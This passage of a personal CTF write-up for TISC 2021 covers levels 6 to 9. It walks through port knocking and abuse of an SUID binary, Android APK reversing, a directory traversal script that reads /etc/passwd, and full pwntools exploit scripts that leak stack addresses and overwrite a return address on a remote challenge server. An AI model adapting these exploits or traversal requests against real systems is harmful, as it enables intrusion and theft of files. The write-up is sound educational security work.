+- HTTP requests to various interally hosted servers with "interesting" looking words in the content body (e.g. an internally hosted CTF server with words like `flag`, `attacker`, and `password`, in case you were searching for packets containing those strings)
+- One device compromising another device by transmitting Metasploit payloads over the network, and then issuing various Meterpreter commands (including `cat /etc/shadow`)
+- Multiple queries to an SQL database that stored compromised login credentials of some of the other devices on the network
+- Many DNS record requests for seemingly random (real) domain names, such as `xkcd.com`
+
+Given that I didn't actually know what I was looking for (other than the fact that it was somehow related to port knocking... probably), there were many promising-looking leads here. First of all, a quick google for other CTFs with port knocking challenges (you can see one example of such a writeup [here](https://deskel.github.io/posts/thm/knockknock)) revealed that participants typically looked for fishy repeating sequences of RST/ACK packets from the server as tell-tale signs of port knocking.
+
+Pursuing this line of attack, I exported all TCP RST/ACK packets to a separate capture file (to make filter application less painful... although it still took 30 seconds), then used Wireshark's conversation menu to display the number of RST/ACK packets exchanged between each pair of IP addresses, as well as the duration over which this exchange occurred. (For example, if two IP addresses exchanged 15 packets over 50000 seconds, it probably didn't contain the sequence I was looking for.)
+
+Unfortunately, after an entire day of staring at these packets, I didn't find anything at all. I then tried investigating several other possible port-knocking strategies (like the ICMP port knocking mentioned above), but none of them turned up anything either.
+
+Eventually, I ran out of ideas, so I decided to do a string search in the main capture file for several "interesting" keywords, such as `password`, `server`, `login`, etc. I was looking through the (mostly irrelevant) search results for `server` when suddenly this popped up:
+
+![6 explanation 2](/assets/tisc-2021/6_2.png "should have searched for funny port numbers to begin with")
+
+Searching for `challenjour` revealed that no other packets contained this string. Furthermore, the "funny" port number tipped me off that this was probably something I was supposed to find... so I decided to look at the packets exchanged between the hosts just before this one.
+
+![6 explanation 3](/assets/tisc-2021/6_3.png)
+
+This explains why I wasn't able to find anything with the RST/ACK packets; the server was being extra sneaky and flat out not responding until the entire knock sequence was successfully received. I tried the knock sequence myself, and sure enough, it worked:
+
+```console
+amarok@ubuntu:~/Desktop$ knock 128.199.211.243 2928 12852 48293 9930 8283
+amarok@ubuntu:~/Desktop$ nc 128.199.211.243 42069
+Use the following information to access the server.
+Username: challenjour
+Password: ,o}@-R};@xsI-(r^A6)V
+```
+
+It's worth noting that the password changes every couple of seconds, so it took a few attempts and some speedy copy-pasting to successfully ssh to the server:
+
+```
+Last login: Fri Nov  5 01:21:41 2021 from 124.246.92.26
+$ ls -al
+total 56
+drwxr-xr-x 3 challenjour challenjour  4096 Nov  4 19:32 .
+drwxr-xr-x 3 root        root         4096 Oct 21 15:27 ..
+-rw------- 1 challenjour challenjour  3975 Nov  4 19:51 .bash_history
+-rw-r--r-- 1 challenjour challenjour   220 Feb 25  2020 .bash_logout
+-rw-r--r-- 1 challenjour challenjour  3771 Feb 25  2020 .bashrc
+drwx------ 1 challenjour challenjour  4096 Nov  4 14:11 .cache
+-rw-r--r-- 1 challenjour challenjour     0 Oct 21 15:26 .cloud-locale-test.skip
+-rw-r--r-- 1 challenjour challenjour   807 Feb 25  2020 .profile
+-rw------- 1 challenjour challenjour     7 Nov  4 17:15 .python_history
+-rwsr-xr-x 1 root        root        18456 Oct 21 15:28 otpkey
+-rw------- 1 root        root           22 Oct 21 15:28 secret.txt
+```
+
+I copied `otpkey` back to my local machine for further analysis with IDA. It was not particularly painful to reverse, so I will summarise what it does below:
+1. We run `otpkey` with the following syntax: `otpkey -m (source_path) (dest_path)`. Obviously, I want to trick `otpkey` into reading `secret.txt`, so for the rest of this summary I will assume that `source_path = secret.txt`.
+2. `otpkey` creates a copy of `secret.txt` at `dest_path` with the same permissions as the original file.
+3. Then, it computes `path` as follows (I will use my Python script to illustrate, as it is somewhat unwieldy to explain through text):
+
+   ```python
+   from Crypto.Cipher import ARC4
+   from Crypto.Hash import MD5
+   from time import time
+
+   # otpkey executes "cat /etc/machine-id" and splits the return result into groups of 2 characters before interpreting each group as a byte
+   # Luckily this file is world-readable so I just extracted the contents myself
+   MACHINE_ID = "fb,60,70,6a,31,2b,4d,da,b8,35,44,5d,28,15,32,27"
+   MACHINE_ID = list(map(lambda x : int(x,16),MACHINE_ID.split(",")))
+
+   RC4 = ARC4.new(b"O).2@g")
+   h = MD5.new()
+
+   r = time()
+   r = bytes(str(int(r//10)),"ascii")
+   r = RC4.encrypt(r)
+   h.update(r)
+   r = list(h.digest())
+   for i in range(len(r)):
+       r[i] = r[i] ^ MACHINE_ID[i]
+   path = "/tmp/otk/"
+   for i in range(len(r)):
+       path += "{:02x}".format(r[i])
+   print(path)
+   ```
+
+4. Finally `otpkey` reads the file at `path` and prints its contents.
+
+Then it's a simple matter of precomputing `path` before actually executing the program (since `path` is valid for 10 seconds), and setting `dest_path = path` when we run `otpkey`. This will cause `otpkey` to copy `secret.txt` to the location that it's going to read from later, and allow us to view the contents of `secret.txt` as a result. I used the script above to do just that. I waited for the clock to tick over the 10 second mark so that I would have as much time as possible to copy-paste the path over, then:
+
+```console
+amarok@ubuntu:~/tisc$ python3 level6.py
+/tmp/otk/40b37569832f041c9ec6cfcc3617c756
+```
+```console
+challenjour@whosthere01:~$ ./otpkey -m secret.txt /tmp/otk/40b37569832f041c9ec6cfcc3617c756
+Requested to move secret.txt to /tmp/otk/40b37569832f041c9ec6cfcc3617c756.
+TISC{v3RY|53CrE+f|@G}
+```
+
+**Flag (100 points):** `TISC{v3RY|53CrE+f|@G}`
+
+***
+
+## 7. The Secret
+
+Nobody in my family even owns an Android device...
+
+![level 7 flavourtext](/assets/tisc-2021/desc_7.png)
+
+Opening `Bye for now.eml` in a text editor reveals what appears to be an email transcript, followed by a HTML version of the same email, and then a massive chunk of base64 within a comment:
+
+![7 explanation 1](/assets/tisc-2021/7_1.png)
+
+I pasted the base64 into [CyberChef](https://gchq.github.io/CyberChef/), which revealed a PNG header. So I saved the hex output as a new file, `hidden.png`, which turned out to be a low-res image of Natasha Romanoff:
+
+![natasha romanoff](/assets/tisc-2021/hidden.png)
+
+I immediately threw the entire image into zsteg, which spat out a URL for a file download:
+
+```console
+amarok@ubuntu:~/tisc$ zsteg -a hidden.png
+imagedata           .. file: Windows Precompiled iNF, version 0.1, InfStyle 1, flags 0xfe, has strings, src URL, volatile dir ids, verified, digitally signed, at 0xffff0100, WinDirPath "\364",, LanguageID 1, at 0xff01 SourcePath "\375", at 0xff000000
+b1,rgba,lsb,xy      .. text: "https://transfer.ttyusb.dev/8S8P76hlG6yEig2ywKOiC6QMak4iGaKc/data.zip"
+(...)
+```
+
+`data.zip` was a password-protected ZIP archive containing an Android APK file, `app.apk`. The challenge creator also helpfully left this hint in the comment field of the archive:
+
+![7 explanation 2](/assets/tisc-2021/7_2.png)
+
+Reversing the string tells us to `THINK AGAIN BEFORE CRACKING` followed by its equivalent in Malay (apparently). This is great advice, so I decided to go digging around `hidden.png` a bit more for the password.
+
+First, I tried using `stegsolve` to inspect the bit planes further. As it turned out, the black background was pretty much uniformly black (except for the two rows used to represent the URL), and only the part of the image occupied by Natasha herself was somewhat noisy. However, I eventually realised that there was no "good" way to detect where Natasha started and where the background ended and it would be rather unreasonable to encode something this way, so I abandoned this line of pursuit.
+
+Next, I tried looking in the EXIF data, but it just contained broken Chinese roughly meaning `Ryan's python only likes the last bit`, which was intended to hint at [`stego-lsb`](https://github.com/ragibson/Steganography), a Python package by Ryan Gibson that was presumably used to hide the URL within the image. I jumped over a few steps with `zsteg`, so this was not new information.
+
+Eventually, I reluctantly entertained the idea that `hidden.png` was of no further relevance to the challenge. I threw `rockyou.txt` at `data.zip` using John the Ripper, which (as expected) got absolutely nowhere.
+
+Then, I stumbled upon [this thread](https://security.stackexchange.com/questions/171271/approaches-to-cracking-an-encrypted-zip-file) which mentioned in particular: `Check that the ZIP file really is encrypted, and not just using a dummy header.` I did some research into [ZIP header formats](https://pkware.cachefly.net/webdocs/casestudies/APPNOTE.TXT) and realised that there is a single bit used to indicate whether a given file in the archive is encrypted (see: section 4.4.4). Perhaps this bit had been manually set, tricking the archive into asking for a password when there was no need for one?
+
+After modifying the relevant flags, I tried dragging `app.apk` out of the archive and the system complied with no complaints whatsoever. Yay!
+
+I downloaded Android Studio, set up an Android Virtual Device, and installed `app.apk`. This turned out to be an app named `The Secret`. I launched it and got this:
+
+![7 explanation 3](/assets/tisc-2021/7_3.png)
+
+At first glance, the app seems to be checking whether we're in a specified place at a specified time. The location requirement is not an issue, because Android Studio's emulator helpfully comes with an extended controls set which, among other things, allows us to forge the emulated device's location (side note: the panel needs to be closed before any changes get applied):
+
+![7 explanation 4](/assets/tisc-2021/7_4.png)
+
+This passed the location check, but I still had no idea what time specifically "15 minutes before sunrise" referred to, and changing the device's time setting to random times didn't seem to make a difference to the time reflected in the app. So I decided to decompile the APK using JADX to try and look for the application logic.
+
+It was a mess, to say the least. Single-letter class and variable names everywhere. And to make matters worse, I don't know the first thing about Android, so I had absolutely no idea how the program flow looked like. However, simply staring at the decompiled Java revealed these three useful pieces of information, purely from the raw strings within:
+
+![7 explanation 5](/assets/tisc-2021/7_5.png)
+
+From the first two snippets here, I was able to infer that the app was contacting `http://worldtimeapi.org/api/timezone/Etc/UTC` and extracting the current time from the `utc_datetime` field of the JSON being returned. This explains why changing the device's local time didn't affect anything. In the third snippet, we see that the app is checking for the device's name, for some reason... although I wasn't able (yet) to find out what it was being checked against.
+
+After digging around a bit more, I found what looked like function prototypes for library functions:
+
+```java
+public final class Myth {
+    static {
+        System.loadLibrary("native-lib");
+    }
+
+    public final native String getNextPlace(String str, double d2, double d3);
+
+    public final native String getTruth(String str1, String str2);
+}
+```
+
+This prompted me to investigate the bundled native libraries further. I opened `app.apk` as an archive and pulled out `lib/x86/libnative-lib.so` for further analysis in IDA. IDA didn't recognise most of the function calls here, but I managed to decipher enough to figure out what I needed:
+
+![7 explanation 6](/assets/tisc-2021/7_6.png)
+
+Here's the logic for the location check; the app seems to be checking whether the device's latitude and longtitude fall within the range of some hardcoded values.
+
+![7 explanation 7](/assets/tisc-2021/7_7.png)
+
+And here's the logic for the time check; specifically, the time window seems to be between 22:30 and 23:15 UTC (contrary to what the description in the app suggests).
+
+![7 explanation 8](/assets/tisc-2021/7_8.png)
+
+Finally, this is (presumably) what the app expects the device to be named as.
+
+Now I had all the pieces of the puzzle, and I just needed to put them together. First, I downloaded [HTTP Toolkit](https://httptoolkit.tech/), which can attach to an emulated Android device and allow you to monitor or manually edit incoming and outgoing HTTP requests. (Programmatic manipulation of requests requires the paid version, though.) Note that this requires root access in order to intercept HTTPS traffic; I had to recreate my virtual device for this because I had originally used a production build, which could not be run as root (according to `adbd`, anyway), and the app had attempted to initiate a HTTPS connection to retrieve some data from another website when I tested it.
+
+Here's what I ended up doing:
+1. I navigated to `AppData\Local\Android\Sdk\platform-tools` and ran `.\adb.exe root`. This gives root access to the virtual device.
+2. Changed the device's name to `GIB's phone`.
+3. Launched HTTP Toolkit on the host machine and attached it to the emulated device. This caused a prompt to pop up on the virtual device, confirming that it was ready.
+4. Set a filter on HTTP Toolkit to detect GET requests to `http://worldtimeapi.org/api/timezone/Etc/UTC` and intercept the response.
+5. Click `I'm in position` in the app, then quickly modify the JSON content in the HTTP response so that the `utc_datetime` field contains a time within the accepted window.
+6. Click `I'm in position` twice more, because the app required that for some reason.
+
+This got me the following output:
+
+![7 explanation 9](/assets/tisc-2021/7_9.png)
+
+**Flag (100 points):** `TISC{YELENAFOUNDAWAYINSHEISOUREYESANDEARSWITHIN}`
+
+***
+
+## 8. Get-Schwifty
+
+Did you really need intel to figure out that your own website was defaced?
+
+![level 8 flavourtext](/assets/tisc-2021/desc_8.png)
+
+Visiting any of the given URLs leads us to a mockup of last year's TISC website:
+
+![8 explanation 1](/assets/tisc-2021/8_1.png)
+
+After looking around the HTML source, I figured out two things. Firstly, there were numerous references to assets stored in the subdirectory `app/index_files/`. Surprisingly, this subdirectory had directory listing enabled:
+
+![8 explanation 2](/assets/tisc-2021/8_2.png)
+
+Secondly, when I did a string search for `PALINDROME` I found a commented out hyperlink to `../hint/`:
+
+![8 explanation 3](/assets/tisc-2021/8_3.png)
+
+Clicking on said hyperlink redirects us to `/hint/?hash=aaf4c61ddcc5e8a2dabede0f3b482cd9aea9434d` (fun fact: this hash is `SHA1("hello")`):
+
+![8 explanation 4](/assets/tisc-2021/8_4.png)
+
+If we look at the source code of this page, we realise that this image is really encoded in base64 and decoded by the browser on the fly as a PNG:
+
+![8 explanation 5](/assets/tisc-2021/8_5.png)
+
+Hmm... strange. If I tried to modify the supplied hash to other things, it usually just redirected me back to the same image, too.
+
+At this point, I was still in site-recon mode, so I decided to take the meme literally and go back to sniffing around the page for more hints (and maybe a hash). I spent an entire day doing this before I realised this (as well as the directory-listing-enabled subfolder) was a red herring.
+
+Then I decided to fuzz the URL parameter with `wfuzz`. This turned up some curious results:
+
+![8 explanation 6](/assets/tisc-2021/8_6.png)
+
+So it seems that we're looking at a directory traversal attack. I decided to test it out on `/etc/passwd`, just to verify that it worked the way I thought it worked. Indeed, I was not redirected back to the meme image. Naturally, `/etc/passwd` is not a PNG file, so the image could not be displayed, but I decoded the base64 in the HTML source and:
+
+```
+root:x:0:0:root:/root:/bin/bash
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+(...)
+```
+
+I figured that most files on the system were unlikely to be PNG images, so I wrote a Python script to send requests to the server for me and automatically decode the base64 before printing out the contents.
+
+```python
+import requests
+from base64 import b64decode
+
+site = "http://tisc21c-wwhvyoobqg08oegfsdvnmcflgfsbx0xd.ctf.sg:42651/hint/?hash="
+while True:
+    query = input()
+    r = requests.get(site+query)
+    print(b64decode(r.text[107:-2]).decode("utf-8"))
+```
+
+Then I decided to start guessing interesting-sounding files that you'd typically find on a webserver. First, I tried `../app/index.php`, which would normally give a 500 Internal Server Error if I attempted to visit it normally. This returned the following:
+
+![8 explanation 7](/assets/tisc-2021/8_7.png)
+
+This looked promising, but ended up not leading anywhere; sending a POST request to the site just threw another error. I guess it was also supposed to be a red herring?
+
+Then I tried `./index.php`, which would normally redirect to the meme image from earlier:
+
+![8 explanation 8](/assets/tisc-2021/8_8.png)
+
+Finally, filenames! Let's check some of them out:
+
+```
+b5dbffb4375997bfcba86c4cd67d74c7aef2b14e
+bin:
+total 28
+-rwsrwxr-x 1 root root 22752 Aug 19 15:59 1adb53a4b156cef3bf91c933d2255ef30720c34f
+
+68a64066b1f37468f5191d627473891ac0ef9243
+i am also on 53619
+```
+
+First, I tried connecting to the server on port 53619, which was running some kind of strange program I could not discern the mechanics of. Then I used the service to leak the binary at `../bin/1adb53a4b156cef3bf91c933d2255ef30720c34f` and saved it to my local machine for analysis. This binary turned out to be identical to the one running earlier.
+
+Now for reverse engineering hell.
+
+***
+
+I tunnel-visioned really hard on this challenge binary and ended up getting stuck here for 4 whole days. Since it is obviously not practical for me to retrace my entire thought process during that time (and not very interesting, because they mostly led to dead ends), I will just do a general summary of what the program does, what I tried, and what ended up working in the end. I will go into detail only when it's necessary to understand what is going on under the hood.
+
+First of all, it's important to know that the binary has the NX bit set, PIE and ASLR enabled, and also uses a stack cookie.
+
+The binary itself was quite painful to reverse, mainly because as previously mentioned, I do all my static analysis on the assembly (IDA freeware can't decompile, and when I tried Ghidra, I found the pseudocode output just as undecipherable; might as well stick with what I'm familiar with). The assembly was rather strange, sometimes employing "alternative" methods for calls and jumps, messing with IDA's stack pointer analysis, and having multiple "useless" subroutine calls (some of which do absolutely nothing before returning, or simply returned what was passed in).
+
+When we run the program, we're greeted with this incredibly judgemental face:
+
+![8 explanation 9](/assets/tisc-2021/8_9.png)
+
+Because the program is kind of complicated, I'll just use a flowchart to go over what it does. Hopefully it's understandable and I didn't make any mistakes.
+
+![8 explanation 10](/assets/tisc-2021/8_10.png)
+
+The buffer overflow required to access the string manipulation options is very easy to perform; passing in a string of 80 `0`'s is sufficient.
+
+It's pretty evident that the intended solution is to perform some kind of heap corruption vulnerability using the string manipulation options, but after many days of staring at the assembly, I was unable to find any vulnerabilities. (Later on, I would learn that the length of the user-supplied string is truncated when it is stored in a 16-bit register, and I was meant to exploit this bounds-checking error.)
+
+Instead, I wasted lots of time trying out different heap-related attacks in the hope that I would eventually be able to leak some pointers. I even leaked various libraries using the directory traversal attack from earlier, thinking that the exploit was specific to a particular `glibc` version. None of these efforts led anywhere; even if I were somehow able to get one of the strings allocated on top of what used to be a linked list node, the program was smart enough to zero out all the interesting pointers when it freed the node beforehand anyway, and I would have gained nothing.
+
+Eventually, I decided to take a closer look at the insecure `memcpy` operations in the sanity check itself. After some initial setup by the subroutine (and a lot of meaningless instructions that ultimately do nothing), the stack looks something like this (you may want to zoom in):
+
+![8 explanation 11](/assets/tisc-2021/8_11.png)
+
+<span style="color:#0000ff">Note: I had noted in the original writeup submitted to CSIT that I was unsure if the stack always looked like this; this is because space for the array contents is allocated with some bitshifting operations and hence the final arrangement of the stack depends on whether it was 16-byte aligned. I'm now pretty sure this is always the case.</span>
+
+Whatever we type into the sanity check is written blindly (yes, with no bounds checking!) to `input`. Then, assuming no variables on the stack are overwritten, the following sequence of operations occurs:
+
+![8 explanation 12](/assets/tisc-2021/8_12.png)
+
+Now, it's very easy to see that if we simply want to access the string manipulation options, all we need to do is perform a simple buffer overflow on `input`. A payload of 80 `0`'s suffices:
+
+![8 explanation 13](/assets/tisc-2021/8_13.png)
+
+We can overwrite `size` with pretty much any value we want (as long as it doesn't contain `0x12`; `\n` characters are interpreted as the end of our input instead). Could we try to leak a pointer by doing something like this?
+
+![8 explanation 14](/assets/tisc-2021/8_14.png)
+
+Well... not really. Recall that only the bytes up to (but not including) the first null byte in `key` is XORed with our string input later on. This presents two problems if we want to leak `&s`:
+1. `size` would have to be, at minimum, `0x01010101`. This sounds like a horrible idea and would probably cause a segfault.
+2. We still need to ensure that `s[size-1]` is nonzero and even, but there's basically no guarantee on what its value would be if we overwrite `size` with such a large value.
+
+Instead, I decided to try something more chance-based. Again, I'll let the diagram (hopefully) do most of the explaining:
+
+![8 explanation 15](/assets/tisc-2021/8_15.png)
+
+Essentially, my payload overwrites the lowest byte of `&s` with... well, something to be decided. Let's call this the **magic byte**. Then, the third `memcpy` operation will populate `key` with the first 15 bytes starting from whatever this new address is.
+
+If we're lucky and `(&s >> 4) << 4 + magic_byte` turns out to be the address of a pointer not containing `00` outside of its most significant bytes (that is, not a pointer like `0x00007fff00000000`), then we will be able to leak the whole pointer. I did not worry about what `byte_flag` would be set to as a result my manipulation and left it up to fate; I will get into the details of what actually happened later.
+
+If we're not so lucky, then we might not be able to access the string manipulation menu, or the data being leaked might not be very useful (e.g. it could be part of the payload we supplied, or some random garbage values).
+
+So I wrote a small script to test this:
+
+```python
+from pwn import *
+
+# Guess the low byte...
+# Manually change this byte here -------v
+payload = b"0"*60 + b"\x10\x00\x00\x00\x50" + b"0"*43 + b"\x82\x00\x00\x00"
+
+p = process("./some_program")
+p.sendlineafter(b"//////////////////////////////////", b"1")
+p.sendlineafter(b"Your answer: ", payload)
+p.sendlineafter(b"//////////////////////////////////", b"2")
+r = p.recvline(timeout=1)
+r = p.recvline(timeout=1)
+if b"Cromulon" in r:
+    p.sendlineafter(b"Passphrase: ", b"A"*64)
+    p.sendlineafter(b"> ", b"4")
+    for i in range(18):
+        r = p.recvline(timeout=10)
+    r = r[:6]
+    s = ""
+    for i in r:
+        x = i^0x41
+        s += hex(x).lstrip("0x") + " "
+    print(s)
+```
+
+For instance, here's some example output after I ran the script many times with `magic_byte` set to `0x50`:
+
+```console
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301864
+[*] Stopped process './some_program' (pid 301864)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301868
+Traceback (most recent call last):
+  (stack trace omitted for your sanity)
+EOFError
+[*] Process './some_program' stopped with exit code -11 (SIGSEGV) (pid 301868)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301873
+30 30 30 30 30 30 
+[*] Stopped process './some_program' (pid 301873)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301877
+30 30 30 30 30 30 
+[*] Stopped process './some_program' (pid 301877)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301881
+30 30 30 30 30 30 
+[*] Stopped process './some_program' (pid 301881)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301885
+[*] Stopped process './some_program' (pid 301885)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301889
+      
+[*] Stopped process './some_program' (pid 301889)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301893
+[*] Stopped process './some_program' (pid 301893)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301897
+[*] Stopped process './some_program' (pid 301897)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301901
+[*] Stopped process './some_program' (pid 301901)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301905
+a0 93 40 f1 fd 7f 
+[*] Stopped process './some_program' (pid 301905)
+amarok@ubuntu:~/tisc$ python3 test.py
+[+] Starting local process './some_program': pid 301909
+a0 89 16 24 fe 7f 
+[*] Stopped process './some_program' (pid 301909)
+```
+
+As you can see, once in a blue moon, something that looks like a pointer pops out. Further investigation with the help of `gdb.attach()` revealed that this occurred exactly when the stack looked like this:
+
+![8 explanation 16](/assets/tisc-2021/8_16.png)
+
+In other words, I somehow managed to acquire the value of `&dest`. Sometimes.
+
+At this point, I feel it is prudent to insert the following disclaimer:
+
+<span style="color:#0000ff">During the competition, I was desperate to solve this challenge, so I went with a don't-touch-it-if-it-works approach towards developing my payload. After returning to my code later on to find out exactly why it worked... I discovered that the details were pretty horrifying, and in hindsight, it's honestly a fluke that it worked at all with my half-baked understanding of what was going on then. </span>
+
+
+#### The gory details
+
+So why does `0x50` work? More importantly, when it works, *why does it only return the address of `dest` and never other pointers*?
+
+Let's focus on the low byte of `&s`. There are a few cases:
+
+1. `0x00`. As in the image above, `0x50` corresponds with the start of the memory region housing the value of `&dest`.
+    
+    The most significant bit of the stack cookie gets written to `byte_flag`; recall that this has to be nonzero and even for us to be able to access the string manipulation options! This means that our payload will succeed with probability 1/16 * 127/256 which works out to about 3.1%.
+
+    In hindsight, it's easy to tweak the value of `size` to eliminate this additional coin-flip (for instance, setting `size = 0x11` would use the lowest byte of the saved rbp instead, which is always `0x90` in this case), but at the point in time that I was writing this exploit, I was just feeling about in the darkness and had absolutely no idea what was really going on.
+
+2. `0x10`. `0x50` corresponds with the start of the memory region housing the value of `&s`.
+
+    The most significant bit of `&input` gets written to `byte_flag`; however, since we are using 48-bit addressing, this is always `0x00`, and we will not be able to access string manipulation options.
+
+3. `0x20` to `0xb0`: `0x50` corresponds with some memory region before where `&s` is stored, but still within our stack frame. This is typically part of our payload.
+
+    This may or may not result in a nonzero even value being written to `byte_flag`, but even if something is successfully leaked, it is easy to filter these cases out since our payload contains many repeated characters. I performed some very rudimentary filtering by checking whether the two lowest bytes are equal.
+
+4. `0xc0` to `0xf0`: `0x50` corresponds to some memory region beyond the top of the stack (the lowest possible address is `$rsp-0x40`).
+
+    This region seems to only contain pointers or zeroes, so we won't be able to access string manipulation options.
+
+I wasn't able to figure out why the program sometimes outright crashes with a segfault, but if I had to guess, it might have something to do with the last case.
+
+Anyway, now we know that if a pointer-like value gets leaked, we know exactly what it's pointing to, as well as the exact configuration of the stack when we enter that subroutine.
+
+With this knowledge, what else can we leak? I decided to look at the stack a bit more in gdb. More specifically, I decided to check out the previous stack frame:
+
+![8 explanation 17](/assets/tisc-2021/8_17.png)
+
+From IDA, I knew that stack cookie for the previous frame was at `$old_rbp-0x8`, and the address of the string literal `SHOW ME WHAT YOU GOT!!!` (stored in global data) was loaded at `$old_rbp-0x10`.
+
+In other words, if I tried the same leak with `magic_byte = 0x80` now, I would be able to calculate the base address of the executable, among other things. This leak will certainly work, because the most significant byte of the stack cookie will again be written to `byte_flag`, and the value of the stack cookie remains the same throughout the program's execution. Since we already successfully leaked the pointer to `dest`, this suggests that the stack cookie is already compatible with our exploit, and we don't have to worry about it anymore.
+
+Again, during the competition, I had no idea how any of this worked and plugged in random magic bytes until a pointer to the global data region fell out. (It's really a wonder that *anything* fell out, honestly.)
+
+Regardless, to sum up, we currently have:
+* The address of `dest` on the stack (and hence the absolute address of anything with a known offset from `dest`)
+* The address of a known location in global data (and hence the address of the win function)
+* A bunch of insecure `memcpy` operations
+
+These three components are sufficient to call the win function and, well, win. We can acquire a write-what-where primitive by redirecting the output of the first `memcpy` operation, and this can be accomplished by overwriting the pointer to `dest` with an address of our choice:
+
+![8 explanation 18](/assets/tisc-2021/8_18.png)
+
+One final note: a pointer to "other function" (any function that blocks on user input before returning) is necessary for the exploit to work remotely. Without it, the program will terminate with a segfault as soon as the win function returns and the connection will be terminated before the flag is received. However, we can resolve this issue by forcing the program to wait on user input by redirecting program flow back into the one of the menus.
+
+My final payload is shown below (yes, I manually spammed the server with connections until it succeeded, and was later informed by the organisers that they noticed a traffic spike right around the time I had solved the challenge. Oops.):
+
+```python
+from pwn import *
+
+context.log_level = 'debug'
+
+# Guess the low byte...
+payload = b"0"*60 + b"\x10\x00\x00\x00\x50" + b"0"*43 + b"\x82\x00\x00\x00" # Leak dest_addr on the stack
+payload2 = b"0"*60 + b"\x10\x00\x00\x00\x80" + b"0"*43 + b"\x82\x00\x00\x00" # Used to leak base address of executable
+
+try:
+    p = remote("tisc21c-v3clxv6ecfdrvyrzn5mz7mchv8v7wcpv.ctf.sg", "53619")
+    p.sendlineafter(b"//////////////////////////////////", b"1")
+    p.sendlineafter(b"Your answer: ", payload)
+    p.sendlineafter(b"//////////////////////////////////", b"2")
+    r = p.recvline(timeout=1)
+    r = p.recvline(timeout=1)
+    if b"Cromulon" in r:
+        p.sendlineafter(b"Passphrase: ", b"A"*64)
+        p.sendlineafter(b"> ", b"4")
+        for i in range(18):
+            r = p.recvline(timeout=10)
+        r = r[:6]
+        x = []
+        for i in r:
+            x += [i^0x41]
+        if x[0] != x[1]:
+            dest_addr = 0
+            for i in range(6):
+                dest_addr += x[i]*(256**i)
+            # Now we know the address of various stack elements
+            input_addr = dest_addr+0x30
+            s_addr = dest_addr+0x60
+            cookie_addr = dest_addr+0xb8
+
+            p.sendlineafter(b"> ", b"6")
+            p.sendlineafter(b"//////////////////////////////////", b"1")
+            p.sendlineafter(b"Your answer: ", payload2)
+            p.sendlineafter(b"//////////////////////////////////", b"2")
+            r = p.recvline(timeout=1)
+            r = p.recvline(timeout=1)
+            p.sendlineafter(b"Passphrase: ", b"A"*64)
+            p.sendlineafter(b"> ", b"4")
+            for i in range(18):
+                r = p.recvline(timeout=10)
+            r = r[:6]
+            x = []
+            for i in r:
+                x += [i^0x41]
+            leaked_addr = 0
+            for i in range(6):
+                leaked_addr += x[i]*(256**i)
+            # Now we know the address of various text/data elements
+            base_addr = leaked_addr-0x6956
+            win_addr = base_addr+0x3bbc
+            
+            p.sendlineafter(b"> ", b"6")
+            p.sendlineafter(b"//////////////////////////////////", b"1")
+            # Leverage the insecure memcpy operations to overwrite saved RIP without touching the cookie
+            payload_save_cookie = p64(win_addr) + p64(base_addr+0x3606) + b"0"*92 + b"\x10\x00\x00\x00" + p64(s_addr) + p64(input_addr) + p64(cookie_addr+0x10)
+            p.sendlineafter(b"Your answer: ", payload_save_cookie)
+            print("!!!!!!!!")
+            p.recv()
+        else:
+            p.close()
+    else:
+        p.close()
+except:
+    pass
+```
+![8 explanation 19](/assets/tisc-2021/8_19.png)
+
+**Flag (100 points):** `TISC{30e903d64775c0120e5c244bfe8cbb0fd44a908b}`
+
+<u>Afterthoughts:</u> I do not feel like I deserved this solve; at least, definitely not with the level of understanding I had of the program during the competition. It's horrifying that I managed to somehow craft a working payload without understanding *why* it worked. Many stars must have aligned that day or something.
+
+***
+
+## 9. 1865 Text Adventure
+
+With only about 48 hours left on the clock and having had a disastrous level 8 experience, I wasn't really expecting to get anywhere with this challenge, so I took a more laid-back approach to things.
+
+![level 9-1 flavourtext](/assets/tisc-2021/desc_9a.png)
+
+Connecting to the service reveals a neat little text adventure.
+
+![9 explanation 1](/assets/tisc-2021/9_1.png)
+
+Getting to the end of the game itself (a small, dead-end room where PALINDROME taunts you) is not particularly difficult, so I won't get into the details of that. However, in the process of doing so, Alice can pick up items in-game that give you additional abilities of sorts:
+
+* The pocket watch (found at the start of the game) gives access to an options menu, where you can disable the text scrolling (because it's slow and annoying). You can also make the game output rainbow text, which is completely unreadable. Why would you do this?
+* The looking glass (found just after the halfway mark) adds a `teleport` command, which I tested out as follows:
+
+  ```
+  [a-mystical-cove] get looking-glass
+  You pick up 'looking-glass'.
+  You pick up the looking glass and look through the lens. Through it you see a multitude of infinite worlds, infinite universes. Suddenly, you feel much more powerful.
+  [a-mystical-cove] teleport
+  You are currently at:
+  sea-of-tears/along-the-rolling-waves/a-sandy-shore/a-mystical-cove
+  [a-mystical-cove] teleport ../
+  Cannot travel through empty rooms. Pay attention to this!
+  ```
+
+    Hmm... looks like a file path?
+* The golden hookah (found near the end of the game) adds a `blowsmoke` command, which... does something I could not immediately discern. While I was attempting this part of the challenge, the locally hosted server which this functionality depends upon was not online for some reason, so the game just threw an exception every time I tried to use this command.
+
+    I emailed the organisers and the issue was resolved by the time I had solved this part.
+
+The output from `teleport ../` was quite interesting, because it suggested that `../` was almost a valid input. Inspired by the path-like location format, I tried this:
+
+```
+[clearing-of-flowers] teleport ..
+You have moved to a new location: '..'.
+
+You look around and see:
+Darkness fills your senses. Nothing can be discerned from your environment.
+There are the following things here:
+  * requirements.txt (note)
+  * rabbit_conf.py (note)
